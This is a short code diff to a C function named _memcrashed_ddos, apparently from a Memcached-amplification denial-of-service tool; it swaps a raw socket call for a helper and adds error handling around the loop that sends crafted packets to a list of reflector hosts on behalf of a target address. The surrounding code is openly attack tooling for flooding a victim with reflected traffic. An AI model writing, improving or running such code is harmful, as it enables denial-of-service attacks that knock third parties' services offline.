@@ -68,7 +68,7 @@ void _memcrashed_ddos(char *target,int port,slist *hosts){
     struct sockaddr_in sin;
     sin.sin_family = AF_INET;
     sin.sin_addr.s_addr = inet_addr(target);
-    int sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    int sock = dos_raw_sock(IPPROTO_TCP, false);
     if(sock < 0){
         die("Failed to open socket!");
     }
@@ -84,7 +84,9 @@ void _memcrashed_ddos(char *target,int port,slist *hosts){
         struct sockaddr_in t;
         t.sin_family=AF_INET;
         t.sin_addr.s_addr=_ip;
-        sendto(sock, datagram, iph->ip_len, 0, (struct sockaddr *) &t, sizeof(t));
+        if(sendto(sock, datagram, iph->ip_len, 0, (struct sockaddr *) &t, sizeof(t))==-1){
+            dperror("Failed to send packet");
+        }
 
         cur=cur->next;
         struct in_addr _t;
